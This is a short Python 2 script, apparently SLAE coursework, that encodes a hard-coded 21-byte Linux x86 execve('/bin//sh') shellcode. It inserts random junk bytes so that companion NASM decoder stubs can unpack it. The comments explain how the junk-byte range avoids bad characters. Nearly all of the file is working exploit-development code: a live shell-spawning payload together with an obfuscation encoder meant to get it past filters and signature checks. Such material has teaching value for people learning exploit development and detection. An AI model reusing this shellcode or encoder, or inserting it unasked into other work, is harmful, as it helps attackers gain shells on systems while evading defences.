#!/usr/bin/python

# Python Insertion Encoder 
#
# Enhancements by SLAE-431, Gitsnik, http://dracyrys.com/
#	This file is used to generate for decoding by:
#		random-insertion-decoder-xorkill.nasm
#		random-insertion-decoder-counter.nasm
#
# Have loaded in my 21 byte execve shellcode into it and randomized the junk bytes.
# This necessitates that we generate a random integer and add it to each string in
# place of the 0xAA code that was previously here.
#
# There are two important things to note.
#
# 1. My python skills are limited but I didn't want to change the encoder too much,
#	and rewriting it would have been "too much".
#
#	As such random numbers smaller than two digits will be displayed as \x5 or
#	0x5. If you are happy with this, go nuts, if not, set the low number to be
#	10 and go for it.
#
# 2. The main thing to change here now (beyond putting in your own shellcode) are
#	the numeric arguments attached to randint. At the moment they are set to
#	be the ascii values roughly approximate to a and Z. Depending on your
#	choice of decoder (xorkill or counter) you can push these out to 1,254 and
#	1,255 respectively. As noted in point 1, I suggest 10,254 and 10,255
#	instead.
#
# Finally, the choice of 65,122 for the random number search space was easy enough
# to make - I wanted to minimise the chance of bad characters (such as 0x0a) being
# present in the resulting shellcode, and the easiest way is to remove the chance
# that they show up in the first place.
#

import random

shellcode = ("\x31\xc9\xf7\xe1\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\xb0\x0b\xcd\x80")

encoded = ""
encoded2 = ""

print 'Encoded shellcode ...'

for x in bytearray(shellcode) :
	encoded += '\\x'
	encoded += '%02x' % x

	integer = random.randint(65,122)	# Mostly a-zA-Z

	encoded += hex( integer ).replace('0x', '\\x')

	encoded2 += '0x'
	encoded2 += '%02x,' %x

	encoded2 += hex( integer )
	encoded2 += ','


print encoded

print encoded2

print 'Len: %d' % len(bytearray(shellcode))
